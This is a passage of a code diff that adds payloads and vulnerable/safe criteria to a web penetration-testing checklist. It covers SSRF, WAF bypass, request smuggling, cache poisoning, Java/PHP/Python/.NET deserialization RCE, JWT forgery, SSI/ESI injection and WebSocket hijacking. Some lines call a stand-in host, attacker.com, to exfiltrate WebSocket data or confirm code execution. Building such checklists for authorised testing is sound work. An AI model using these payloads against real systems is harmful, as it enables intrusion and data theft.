+        expectedResponse: {
+          vulnerable: "A GCS/Azure Blob container is publicly listable/readable without authentication.",
+          safe: "Cloud storage containers require authentication and deny anonymous access.",
+        },
         severity: "critical",
       },
       {
         id: "web-cloud-4",
         text: "Test for overly permissive IAM roles attached to compute instances",
         how: "If instance credentials are obtained, check the scope of the attached IAM role/policy for excessive permissions.",
+        payloads: ["aws sts get-caller-identity --profile stolen-creds", "aws iam simulate-principal-policy --policy-source-arn <role-arn> --action-names 's3:*' 'iam:*'"],
+        expectedResponse: {
+          vulnerable: "The compute instance's IAM role grants broad permissions (e.g. full S3/EC2 access) beyond what the running application needs, discoverable via stolen instance credentials.",
+          safe: "The IAM role follows least privilege, granting only the specific permissions the application needs.",
+        },
         severity: "critical",
       },
       {
         id: "web-cloud-5",
         text: "Check for exposed container registry or image with secrets baked in",
         how: "If a container registry is reachable, pull images and scan layers for hardcoded credentials.",
+        payloads: ["curl https://registry.example.com/v2/_catalog", "docker pull registry.example.com/app:latest && trivy image registry.example.com/app:latest"],
+        expectedResponse: {
+          vulnerable: "The exposed container registry/image is pullable and contains baked-in secrets (API keys, private keys) in layers or environment variables.",
+          safe: "The container registry requires authentication, or images contain no baked-in secrets.",
+        },
         severity: "high",
       },
       {
         id: "web-cloud-6",
         text: "Test for SSRF-to-cloud-function abuse (serverless internal endpoints)",
         how: "Check if internal serverless/lambda invocation URLs are reachable via SSRF, bypassing intended API gateway auth.",
+        payloads: ["http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role", "http://localhost:9001/2015-03-31/functions/function/invocations"],
+        expectedResponse: {
+          vulnerable: "An SSRF payload reaches an internal serverless/cloud function endpoint not meant to be externally invokable.",
+          safe: "Internal serverless endpoints are not reachable via SSRF and require proper invocation authentication.",
+        },
         severity: "high",
       },
     ],
@@ -2209,42 +3531,77 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-data-exp-1",
         text: "Check for sensitive data in page source and HTML comments",
         how: "View source on key pages and search for leftover comments containing credentials, internal notes, or TODOs.",
+        payloads: ["curl -s https://example.com | grep -Eo '<!--.*-->'"],
+        expectedResponse: {
+          vulnerable: "Page source or HTML comments contain sensitive data (internal notes, credentials, debug info, old endpoint references).",
+          safe: "No sensitive data appears in page source or HTML comments.",
+        },
         severity: "medium",
       },
       {
         id: "web-data-exp-2",
         text: "Check for API keys and secrets in client-side code",
         how: "Search bundled JS/HTML for embedded third-party API keys that should be server-side only.",
+        payloads: ["grep -rEo \"(AIza[0-9A-Za-z_-]{35}|sk_live_[0-9a-zA-Z]{24}|AKIA[0-9A-Z]{16})\" ./downloaded_js/"],
+        expectedResponse: {
+          vulnerable: "Client-side code contains hardcoded API keys/secrets usable to access privileged functionality.",
+          safe: "No sensitive API keys/secrets are present in client-side code; any exposed keys are properly scoped/restricted.",
+        },
         severity: "high",
       },
       {
         id: "web-data-exp-3",
         text: "Check for excessive data exposure in API responses",
         how: "Compare what's shown in the UI vs the raw API response — APIs often return more fields (internal IDs, other users' partial data) than rendered.",
+        payloads: ["curl -b 'session=<token>' https://example.com/api/users/me | jq"],
+        expectedResponse: {
+          vulnerable: "API responses include extra fields beyond what the UI displays (e.g. password hashes, internal flags, other users' data), an excessive data exposure issue.",
+          safe: "API responses are filtered server-side to include only the fields the client legitimately needs.",
+        },
         severity: "medium",
       },
       {
         id: "web-data-exp-4",
         text: "Check for PII exposure in error messages or logs endpoint",
         how: "Trigger errors and check if stack traces or debug output leak personal data or internal system details.",
+        payloads: ["curl 'https://example.com/api/users?id=abc'  # non-numeric ID to trigger type-cast error"],
+        expectedResponse: {
+          vulnerable: "Error messages or a logs endpoint expose PII (emails, names, tokens) that shouldn't be visible to the requester.",
+          safe: "Error messages/logs are generic and contain no PII visible to unauthorized requesters.",
+        },
         severity: "medium",
       },
       {
         id: "web-data-exp-5",
         text: "Check autocomplete attribute on sensitive form fields",
         how: "Verify password/PII fields set autocomplete='off' where required by the app's own security stance.",
+        payloads: ["curl -s https://example.com/payment | grep -Eo '<input[^>]*name=\"(card|cvv|ssn)\"[^>]*>'"],
+        expectedResponse: {
+          vulnerable: "Sensitive fields (passwords, card numbers) lack autocomplete=\"off\"/\"new-password\", allowing browsers to store/autofill them insecurely.",
+          safe: "Sensitive form fields correctly set autocomplete to prevent insecure storage/autofill.",
+        },
         severity: "low",
       },
       {
         id: "web-data-exp-6",
         text: "Check for cached sensitive pages via browser/proxy cache headers",
         how: "Verify Cache-Control: no-store is set on pages containing sensitive data to prevent caching on shared proxies.",
+        payloads: ["curl -I -b 'session=<token>' https://example.com/account/statements | grep -i cache-control"],
+        expectedResponse: {
+          vulnerable: "Sensitive pages lack proper Cache-Control headers and are retrievable from browser/proxy cache after the fact.",
+          safe: "Sensitive pages set Cache-Control: no-store, preventing caching by browsers or intermediate proxies.",
+        },
         severity: "medium",
       },
       {
         id: "web-data-exp-7",
         text: "Test for GraphQL introspection leaking internal schema",
         how: "Query the introspection endpoint in production to check if internal-only types/fields/mutations are exposed.",
+        payloads: ["curl -X POST https://example.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name}}}}\"}'"],
+        expectedResponse: {
+          vulnerable: "GraphQL introspection is enabled and returns the full internal schema, revealing hidden types/fields/mutations.",
+          safe: "Introspection is disabled in production, returning an error or empty schema for introspection queries.",
+        },
         severity: "medium",
       },
     ],
@@ -2259,36 +3616,66 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-error-1",
         text: "Test for verbose error messages with stack traces",
         how: "Trigger malformed input/unexpected states and check if a full stack trace is returned to the client.",
+        payloads: ["curl -X POST https://example.com/api/data -H 'Content-Type: application/json' -d '{malformed'"],
+        expectedResponse: {
+          vulnerable: "Triggering an error returns a full stack trace revealing internal code structure, file paths, or logic.",
+          safe: "Errors return a generic message with no stack trace or internal details exposed.",
+        },
         severity: "medium",
       },
       {
         id: "web-error-2",
         text: "Test for database error disclosure",
         how: "Trigger a DB-level error (malformed query) and check if raw DB error text/query is returned in the response.",
+        payloads: ["curl \"https://example.com/item?id=1'\""],
+        expectedResponse: {
+          vulnerable: "A malformed input triggers a raw database error message revealing query structure, table/column names, or DB type.",
+          safe: "Database errors are caught and a generic error message is returned, with no query/schema details leaked.",
+        },
         severity: "high",
       },
       {
         id: "web-error-3",
         text: "Test for internal file path disclosure in errors",
         how: "Trigger a 500 error and check if the response reveals internal server file paths.",
+        payloads: ["curl -X POST https://example.com/api/upload -F 'file=@/dev/null;filename=\\x00.jpg'"],
+        expectedResponse: {
+          vulnerable: "An error message reveals internal server file paths (e.g. \"/var/www/app/controllers/...\").",
+          safe: "Error messages contain no internal file path information.",
+        },
         severity: "low",
       },
       {
         id: "web-error-4",
         text: "Test for inconsistent error messages revealing internal state",
         how: "Compare error responses for different failure conditions (user not found vs wrong password) to check for information leakage.",
+        payloads: ["curl -X POST https://example.com/login -d 'user=nonexistent@test.com&pass=x'", "curl -X POST https://example.com/login -d 'user=admin@example.com&pass=wrongpass'"],
+        expectedResponse: {
+          vulnerable: "Different error messages for different failure conditions (e.g. \"user not found\" vs \"wrong password\") reveal internal state useful for enumeration.",
+          safe: "Error messages are generic and consistent regardless of the specific internal failure condition.",
+        },
         severity: "medium",
       },
       {
         id: "web-error-5",
         text: "Test custom 404/500 pages for information disclosure",
         how: "Confirm custom error pages don't leak framework/version info that default pages would have hidden.",
+        payloads: ["curl https://example.com/nonexistent-page-xyz"],
+        expectedResponse: {
+          vulnerable: "Custom 404/500 pages leak information such as software version, internal paths, or debug data.",
+          safe: "Custom error pages are generic and reveal no software/version/internal details.",
+        },
         severity: "low",
       },
       {
         id: "web-error-6",
         text: "Test malformed Content-Type/body for unhandled exceptions",
         how: "Send unexpected content types or malformed bodies (truncated JSON, wrong charset) and check the app fails gracefully.",
+        payloads: ["curl -X POST https://example.com/api/data -H 'Content-Type: application/xml' -d '{\"a\":1}'", "curl -X POST https://example.com/api/data -H 'Content-Type: application/json' -d '{\"a\":'"],
+        expectedResponse: {
+          vulnerable: "Sending a malformed Content-Type/body causes an unhandled exception with a verbose error/stack trace in the response.",
+          safe: "Malformed requests are gracefully handled and return a clean, generic error response.",
+        },
         severity: "low",
       },
     ],
@@ -2304,6 +3691,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test WAF bypass with URL encoding of payloads",
         how: "Encode blocked payload characters to see if the WAF decodes differently than the backend, letting the payload through.",
         payloads: ["%3Cscript%3E"],
+        expectedResponse: {
+          vulnerable: "URL-encoding the payload bypasses the WAF's pattern matching and it still triggers the underlying vulnerability.",
+          safe: "The WAF decodes and inspects URL-encoded input, still blocking the payload.",
+        },
         severity: "medium",
       },
       {
@@ -2311,6 +3702,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test WAF bypass with double URL encoding",
         how: "Double-encode payload characters; some WAFs only decode once before inspection while the backend decodes twice.",
         payloads: ["%253Cscript%253E"],
+        expectedResponse: {
+          vulnerable: "Double URL-encoding bypasses the WAF (which only decodes once) and the payload reaches the application intact.",
+          safe: "The WAF fully normalizes/decodes nested encodings before inspection, still blocking the payload.",
+        },
         severity: "medium",
       },
       {
@@ -2318,6 +3713,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test WAF bypass with case variation and inline comments",
         how: "Mix character case or insert SQL/HTML comments mid-keyword to evade signature-based detection.",
         payloads: ["SeLeCt", "UNI/**/ON SEL/**/ECT"],
+        expectedResponse: {
+          vulnerable: "Case variation and inline SQL/JS comments bypass signature-based WAF rules and the payload still executes/triggers the vulnerability.",
+          safe: "The WAF normalizes case and strips/accounts for inline comments, still detecting and blocking the payload.",
+        },
         severity: "medium",
       },
       {
@@ -2325,18 +3724,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test WAF bypass via alternate HTTP methods/paths",
         how: "Try the same payload via a different HTTP method, header-based override, or slightly altered path the WAF rule doesn't cover.",
         payloads: ["X-HTTP-Method-Override: PUT"],
+        expectedResponse: {
+          vulnerable: "Using an alternate HTTP method or path (e.g. a rewrite trick) reaches the application without passing through the WAF's rule set for that route.",
+          safe: "The WAF applies its rule set consistently across all methods/paths, leaving no unprotected route.",
+        },
         severity: "medium",
       },
       {
         id: "web-waf-5",
         text: "Test WAF bypass with oversized/chunked requests",
         how: "Split the payload across chunked transfer-encoding or pad the request beyond the WAF's inspection size limit.",
+        payloads: ["curl -X POST https://example.com/search -H 'Transfer-Encoding: chunked' --data-binary $'5\\r\\n<scri\\r\\n2\\r\\npt\\r\\n8\\r\\n>alert(1)\\r\\n0\\r\\n\\r\\n'", "python3 -c \"print('A'*100000 + \\\"' OR SLEEP(5)-- -\\\")\""],
+        expectedResponse: {
+          vulnerable: "An oversized or chunked request bypasses WAF inspection limits and the payload reaches the backend unfiltered.",
+          safe: "The WAF correctly inspects oversized/chunked requests up to the backend's own limits, still blocking the payload.",
+        },
         severity: "medium",
       },
       {
         id: "web-waf-6",
         text: "Test direct origin IP access bypassing the WAF entirely",
         how: "If the origin server IP is discoverable (recon phase), test whether it's reachable directly, skipping the WAF/CDN in front of the domain.",
+        payloads: ["curl -H 'Host: example.com' https://<origin-ip>/ -k", "shodan search 'ssl:\"example.com\"'"],
+        expectedResponse: {
+          vulnerable: "The application is directly reachable via its origin IP, completely bypassing the WAF's protections.",
+          safe: "The origin server rejects direct IP-based access (or only accepts traffic from the WAF/CDN's IP range), so the WAF cannot be bypassed this way.",
+        },
         severity: "high",
       },
     ],
@@ -2353,12 +3766,22 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-adv-smug-1",
         text: "Test for CL.TE request smuggling",
         how: "Send a request with conflicting Content-Length and Transfer-Encoding headers, structured so front-end and back-end disagree on body length.",
+        payloads: ["POST / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED"],
+        expectedResponse: {
+          vulnerable: "A CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding) discrepancy causes the smuggled request to be processed as a separate request, affecting another user's response.",
+          safe: "Both front-end and back-end agree on Content-Length vs Transfer-Encoding handling (or the ambiguous header is rejected), preventing smuggling.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-smug-2",
         text: "Test for TE.CL request smuggling",
         how: "Craft the inverse conflict (front-end trusts Transfer-Encoding, back-end trusts Content-Length) to smuggle a second hidden request.",
+        payloads: ["POST / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 3\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n"],
+        expectedResponse: {
+          vulnerable: "A TE.CL discrepancy allows a smuggled request to be interpreted differently by front-end and back-end, poisoning subsequent requests.",
+          safe: "The front-end and back-end handle Transfer-Encoding/Content-Length identically, or reject ambiguous requests, preventing smuggling.",
+        },
         severity: "critical",
       },
       {
@@ -2366,18 +3789,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for TE.TE request smuggling via obfuscated header",
         how: "Obfuscate the Transfer-Encoding header (extra spaces, tab, duplicate header) so one server ignores it while the other honors it.",
         payloads: ["Transfer-Encoding: chunked", "Transfer-Encoding : chunked"],
+        expectedResponse: {
+          vulnerable: "An obfuscated Transfer-Encoding header (e.g. \"Transfer-Encoding: xchunked\" or with extra whitespace) is interpreted differently by front and back end, enabling smuggling.",
+          safe: "Obfuscated Transfer-Encoding variants are rejected or normalized identically by both front-end and back-end.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-smug-4",
         text: "Confirm smuggling via timing-based differential test",
         how: "Send a smuggling probe designed to cause a timeout only if the payload is interpreted as intended, confirming the vulnerability without needing a second victim request.",
+        payloads: ["// Burp HTTP Request Smuggler extension: run the CL.TE / TE.CL timing probes against the target endpoint"],
+        expectedResponse: {
+          vulnerable: "A timing differential (delayed response) confirms the smuggled request is queued and processed as a separate request on the back-end connection.",
+          safe: "No timing differential is observed, indicating the ambiguous request is not being smuggled.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-smug-5",
         text: "Test smuggling impact: response queue poisoning",
         how: "Once confirmed, demonstrate impact by smuggling a request that causes the next real user's response to be hijacked.",
+        payloads: ["POST / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 130\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /404 HTTP/1.1\\r\\nHost: example.com\\r\\nFoo: bar"],
+        expectedResponse: {
+          vulnerable: "Smuggled requests cause another user's response to be returned to the attacker (response queue poisoning), leaking their data.",
+          safe: "No cross-user response contamination occurs; each connection's responses map correctly to their own requests.",
+        },
         severity: "critical",
       },
     ],
@@ -2392,12 +3829,22 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-adv-cache-1",
         text: "Test for web cache poisoning via unkeyed headers",
         how: "Inject a payload into a header not included in the cache key (e.g. X-Forwarded-Host) and check if the poisoned response gets cached and served to others.",
+        payloads: ["curl -H 'X-Forwarded-Host: evil.com' https://example.com/", "curl -H 'X-Forwarded-Scheme: http' https://example.com/"],
+        expectedResponse: {
+          vulnerable: "An unkeyed header (e.g. X-Forwarded-Host) injected into the response gets cached and served to other users, poisoning the cache.",
+          safe: "Unkeyed headers do not influence the cached response content, or the cache key includes all headers that affect output.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-cache-2",
         text: "Test cache poisoning via unkeyed query parameters",
         how: "Add an extra query parameter that the cache ignores but the origin server processes, to smuggle a payload into a cached response.",
+        payloads: ["curl 'https://example.com/page?utm_content=\"><script>alert(1)</script>'"],
+        expectedResponse: {
+          vulnerable: "An unkeyed query parameter alters the response, and that altered response is cached and served to subsequent users.",
+          safe: "Unkeyed query parameters do not alter cached response content, or the cache key includes them.",
+        },
         severity: "high",
       },
       {
@@ -2405,12 +3852,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for web cache deception",
         how: "Append a static-looking extension to a dynamic authenticated URL (e.g. /account.css) to trick the cache into storing a personalized page publicly.",
         payloads: ["/account/profile/nonexistent.css"],
+        expectedResponse: {
+          vulnerable: "A crafted URL (e.g. /profile/../static.css) causes a private/dynamic response to be cached under a static-looking path and served to other users.",
+          safe: "The cache correctly distinguishes dynamic from static paths and does not cache private content under a shared key.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-cache-4",
         text: "Test cache-based DoS via cache-key normalization abuse",
         how: "Send requests with many variations of a low-cardinality-expected parameter to fill the cache and evict legitimate entries.",
+        payloads: ["for i in {1..1000}; do curl \"https://example.com/page?cachebust=$i\"; done"],
+        expectedResponse: {
+          vulnerable: "Cache-key normalization differences (e.g. path variations treated as the same key) allow flooding the cache with variants, causing legitimate content to be evicted (DoS).",
+          safe: "Cache-key normalization is precise and consistent, preventing key-confusion-based cache flooding.",
+        },
         severity: "medium",
       },
     ],
@@ -2425,30 +3881,55 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-adv-deser-1",
         text: "Test for insecure deserialization in Java",
         how: "Identify endpoints accepting serialized Java objects and test known gadget chains (ysoserial) for RCE.",
+        payloads: ["java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' | base64"],
+        expectedResponse: {
+          vulnerable: "A crafted Java serialized object (using a known gadget chain, e.g. ysoserial) achieves remote code execution when deserialized.",
+          safe: "The application uses a safe deserialization approach (allowlisting classes, avoiding native deserialization of untrusted data), and the payload fails to execute.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-deser-2",
         text: "Test for insecure deserialization in PHP",
         how: "Identify unserialize() calls on user-controlled input and test for object injection using available gadget classes.",
+        payloads: ["O:8:\"stdClass\":1:{s:4:\"data\";s:6:\"pwned\";}", "phpggc Monolog/RCE1 system id -b"],
+        expectedResponse: {
+          vulnerable: "A crafted PHP serialized object triggers a magic method (__wakeup/__destruct) gadget chain leading to RCE or file write.",
+          safe: "PHP deserialization of untrusted input is avoided or restricted to safe classes, and the payload has no effect.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-deser-3",
         text: "Test for insecure deserialization in Python (pickle)",
         how: "Check for pickle.loads() on user-controlled data, which allows arbitrary code execution via a crafted payload.",
+        payloads: ["python3 -c \"import pickle,os,base64\\nclass E:\\n def __reduce__(self): return (os.system,('id',))\\nprint(base64.b64encode(pickle.dumps(E())))\""],
+        expectedResponse: {
+          vulnerable: "A malicious pickle payload executes arbitrary code when unpickled by the server.",
+          safe: "The server does not unpickle untrusted input (uses JSON or a safe format instead), so the payload never executes.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-deser-4",
         text: "Test for .NET deserialization (BinaryFormatter/ViewState)",
         how: "Check for ViewState or BinaryFormatter deserialization of user-controlled data without MAC validation.",
+        payloads: ["ysoserial.net -p ViewState -g TypeConfuseDelegate -c \"id\" --validationalg=\"SHA1\" --validationkey=\"<leaked_key>\""],
+        expectedResponse: {
+          vulnerable: "A crafted BinaryFormatter payload or malicious ViewState (with a leaked/weak MachineKey) achieves RCE upon deserialization.",
+          safe: "ViewState/MachineKey validation is properly enforced (or BinaryFormatter is avoided), and tampered payloads are rejected.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-deser-5",
         text: "Identify serialized object formats hidden in cookies/params",
         how: "Look for base64-encoded blobs in cookies/hidden fields that decode to serialized object formats (e.g. starting with rO0 for Java, O:8 for PHP).",
+        payloads: ["echo '<cookie_value>' | base64 -d | xxd | head -1  # look for rO0AB (Java) or O:8 (PHP) magic"],
+        expectedResponse: {
+          vulnerable: "A cookie/parameter value is identified as a serialized object format (Java, PHP, .NET), confirming a potential deserialization attack surface worth deeper testing.",
+          safe: "No serialized object formats are found in cookies/parameters, indicating no obvious deserialization attack surface.",
+        },
         severity: "high",
       },
     ],
@@ -2463,12 +3944,22 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-adv-jwt-1",
         text: "Test JWT alg:none bypass",
         how: "Modify the JWT header alg to 'none' and strip the signature to see if the server still accepts it.",
+        payloads: ["jwt_tool <token> -X a", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."],
+        expectedResponse: {
+          vulnerable: "A token with \"alg\":\"none\" and an empty signature is accepted as valid by the server.",
+          safe: "The server explicitly rejects the none algorithm and requires a valid signature.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-jwt-2",
         text: "Test JWT algorithm confusion RS256 to HS256",
         how: "Re-sign the token using the server's public key as an HMAC secret to forge a valid signature.",
+        payloads: ["jwt_tool <token> -X k -pk public_key.pem"],
+        expectedResponse: {
+          vulnerable: "An RS256 token re-signed as HS256 (using the public key as the HMAC secret) is accepted as valid.",
+          safe: "The server enforces the expected algorithm per key type and rejects tokens whose algorithm doesn't match the expected one.",
+        },
         severity: "critical",
       },
       {
@@ -2476,30 +3967,54 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test JWT weak HMAC secret via brute-force",
         how: "Attempt to crack the HS256 signing secret offline using a wordlist (e.g. with hashcat/jwt_tool).",
         payloads: ["jwt_tool <token> -C -d wordlist.txt"],
+        expectedResponse: {
+          vulnerable: "A brute-force/dictionary attack recovers the HMAC secret, allowing forged tokens to be signed and accepted.",
+          safe: "The HMAC secret is long and random enough to resist brute-force/dictionary attacks within a practical timeframe.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-jwt-4",
         text: "Test JWT kid header injection (path traversal / SQLi)",
         how: "Manipulate the 'kid' header to point to a file/key the attacker controls or influences (path traversal, SQLi into key lookup).",
+        payloads: ["{\"kid\":\"../../../../dev/null\",\"alg\":\"HS256\"}", "{\"kid\":\"' UNION SELECT 'known_hmac_secret'-- -\",\"alg\":\"HS256\"}"],
+        expectedResponse: {
+          vulnerable: "A manipulated kid header (path traversal to a predictable file, or SQLi in a DB-backed key lookup) causes the server to verify the token against an attacker-influenced key.",
+          safe: "The kid value is validated against a strict allowlist of known key identifiers before being used in key lookup.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-jwt-5",
         text: "Test JWT expiry (exp) enforcement",
         how: "Replay a JWT past its exp timestamp and confirm the server actually rejects it rather than trusting the client.",
+        payloads: ["curl -H 'Authorization: Bearer <expired_jwt>' https://example.com/api/account"],
+        expectedResponse: {
+          vulnerable: "An expired token (past its exp claim) is still accepted by the server.",
+          safe: "The server checks and rejects tokens with an expired exp claim.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-jwt-6",
         text: "Test JWT signature verification is actually enforced",
         how: "Tamper with the payload (e.g. change role/sub claim) while keeping the original signature, and confirm the server rejects the mismatch.",
+        payloads: ["jwt_tool <token> -T  # interactively edit claims, keep original signature"],
+        expectedResponse: {
+          vulnerable: "A token with a tampered payload (e.g. changed role) but an invalid/random signature is still accepted, indicating signature verification isn't actually enforced.",
+          safe: "The server correctly verifies the signature on every request and rejects tokens with an invalid signature.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-jwt-7",
         text: "Test JWT stored in localStorage vs httpOnly cookie for XSS exposure",
         how: "If tokens are stored in localStorage, note that any XSS becomes full account takeover — check storage location as part of severity assessment.",
+        payloads: ["// DevTools console: localStorage.getItem('jwt') || localStorage.getItem('token')"],
+        expectedResponse: {
+          vulnerable: "The JWT is stored in localStorage, making it readable/stealable by any XSS payload.",
+          safe: "The JWT is stored in an httpOnly, Secure cookie, inaccessible to JavaScript even if XSS exists.",
+        },
         severity: "medium",
       },
     ],
@@ -2514,12 +4029,22 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-adv-micro-1",
         text: "Test for service discovery endpoint exposure",
         how: "Check if internal service registry endpoints (Consul, Eureka) are reachable externally, revealing internal topology.",
+        payloads: ["curl http://example.com:8500/v1/catalog/services", "curl http://example.com:8761/eureka/apps"],
+        expectedResponse: {
+          vulnerable: "A service discovery endpoint (e.g. Consul, Eureka) is reachable and lists internal service names/addresses without authentication.",
+          safe: "The service discovery endpoint requires authentication and is not reachable externally.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-micro-2",
         text: "Test for API gateway authentication bypass",
         how: "Check if internal microservices are reachable directly, bypassing the gateway's auth layer entirely.",
+        payloads: ["curl http://internal-service.example.com:8080/api/users  # bypass gateway at api.example.com"],
+        expectedResponse: {
+          vulnerable: "A request bypassing the API gateway (direct to a backend service) succeeds without authentication that the gateway would normally enforce.",
+          safe: "Backend services independently enforce authentication and reject unauthenticated requests even when accessed directly.",
+        },
         severity: "critical",
       },
       {
@@ -2527,18 +4052,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for internal header spoofing trusted by backend services",
         how: "If the gateway adds headers like X-User-Id after auth, check if a direct request to the backend with a spoofed header is trusted without re-verification.",
         payloads: ["X-User-Id: 1", "X-Internal-Request: true"],
+        expectedResponse: {
+          vulnerable: "A spoofed internal header (e.g. X-Internal-Request: true or X-User-Role: admin) is trusted by a backend service, bypassing the gateway's checks.",
+          safe: "Backend services do not trust client-settable internal headers, or verify them via a signed/mTLS mechanism the client cannot forge.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-micro-4",
         text: "Test for SSRF pivoting between internal microservices",
         how: "Use a confirmed SSRF on one service to reach other internal-only services not otherwise exposed.",
+        payloads: ["http://internal-billing-service.internal:8080/api/admin", "http://10.0.1.5:9200/_cat/indices"],
+        expectedResponse: {
+          vulnerable: "An SSRF vector on one microservice reaches and interacts with another internal microservice not otherwise exposed.",
+          safe: "Internal microservices are network-isolated and unreachable via SSRF pivoting from an external-facing service.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-micro-5",
         text: "Test rate limiting consistency across gateway vs direct service access",
         how: "Confirm rate limits enforced at the gateway can't be bypassed by hitting a service through an alternate exposed path.",
+        payloads: ["for i in {1..100}; do curl https://internal-service.example.com:8080/api/data & done; wait  # vs gateway-enforced limit"],
+        expectedResponse: {
+          vulnerable: "Direct requests to a backend service bypass the rate limiting enforced only at the gateway, allowing unlimited requests.",
+          safe: "Rate limiting is enforced consistently whether accessed via the gateway or directly against the backend service.",
+        },
         severity: "medium",
       },
     ],
@@ -2554,6 +4093,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for SSI directive injection",
         how: "Inject SSI directives into fields that may be rendered by a server supporting SSI (.shtml pages) to execute commands.",
         payloads: ["<!--#exec cmd=\"id\"-->"],
+        expectedResponse: {
+          vulnerable: "An SSI directive (e.g. <!--#exec cmd=\"id\"-->) injected into a page is executed by the server, returning command output.",
+          safe: "SSI directives in user input are stripped/escaped and are not executed by the server.",
+        },
         severity: "critical",
       },
       {
@@ -2561,6 +4104,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for SSI-based file inclusion",
         how: "Attempt to include arbitrary server files via SSI include directives.",
         payloads: ["<!--#include file=\"/etc/passwd\"-->"],
+        expectedResponse: {
+          vulnerable: "An SSI include directive (<!--#include file=\"...\"-->) is used to include and expose arbitrary local files.",
+          safe: "SSI include directives are disabled or restricted to a safe allowlist, preventing arbitrary file inclusion.",
+        },
         severity: "high",
       },
       {
@@ -2568,12 +4115,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for Edge Side Includes (ESI) injection on CDN/reverse proxy",
         how: "If the app sits behind an ESI-capable proxy (Varnish/Akamai), test for ESI injection to perform SSRF or cache manipulation.",
         payloads: ["<esi:include src=\"http://169.254.169.254/\"/>"],
+        expectedResponse: {
+          vulnerable: "An ESI include directive injected into a response is processed by the CDN/reverse proxy, allowing SSRF or content injection.",
+          safe: "The CDN/reverse proxy does not process user-controlled ESI directives, or ESI is disabled.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-ssi-4",
         text: "Confirm SSI/ESI support before deeper testing",
         how: "Check response headers/file extensions to confirm SSI or ESI processing is actually active before investing time in payload variations.",
+        payloads: ["curl -I https://example.com/page.shtml", "curl -H 'Surrogate-Capability: abc=\"Surrogate/1.0 ESI/1.0\"' -I https://example.com/"],
+        expectedResponse: {
+          vulnerable: "A test SSI/ESI directive is processed and reflected/executed, confirming support before deeper exploitation.",
+          safe: "The test directive is not processed and appears as literal text, confirming SSI/ESI is not supported or is disabled.",
+        },
         severity: "info",
       },
     ],
@@ -2588,36 +4144,66 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-adv-ws-1",
         text: "Test WebSocket handshake for missing authentication",
         how: "Connect directly to the WebSocket endpoint without the normal auth flow and check if it still accepts the connection.",
+        payloads: ["wscat -c wss://example.com/socket  # no Cookie/Authorization header sent"],
+        expectedResponse: {
+          vulnerable: "The WebSocket handshake completes and the connection is fully functional without any authentication token/cookie validation.",
+          safe: "The handshake requires a valid authentication token/cookie, and unauthenticated connection attempts are rejected.",
+        },
         severity: "high",
       },
       {
         id: "web-adv-ws-2",
         text: "Test for cross-site WebSocket hijacking (CSWSH)",
         how: "Check if the WebSocket handshake validates the Origin header — if not, a malicious page can open an authenticated connection using the victim's cookies.",
+        payloads: ["<script>var ws=new WebSocket('wss://example.com/socket'); ws.onmessage=function(e){fetch('https://attacker.com/log?d='+btoa(e.data))}</script>"],
+        expectedResponse: {
+          vulnerable: "A cross-site page can open a WebSocket connection to the target (no Origin check during handshake) and interact with it using the victim's session, confirming CSWSH.",
+          safe: "The server validates the Origin header during the WebSocket handshake and rejects connections from untrusted origins.",
+        },
         severity: "critical",
       },
       {
         id: "web-adv-ws-3",
         text: "Test for injection vulnerabilities in WebSocket messages",
         how: "Fuzz message payloads sent over the socket the same way as HTTP params — WebSocket traffic often bypasses HTTP-focused WAFs entirely.",
+        payloads: ["wscat -c wss://example.com/socket -x '{\"action\":\"search\",\"query\":\"'\\'' OR SLEEP(5)-- -\"}'", "wscat -c wss://example.com/socket -x '{\"msg\":\"<img src=x onerror=alert(1)>\"}'"],
+        expectedResponse: {
+          vulnerable: "Injecting a payload into a WebSocket message field triggers an injection vulnerability (XSS, SQLi, etc.) server- or client-side.",
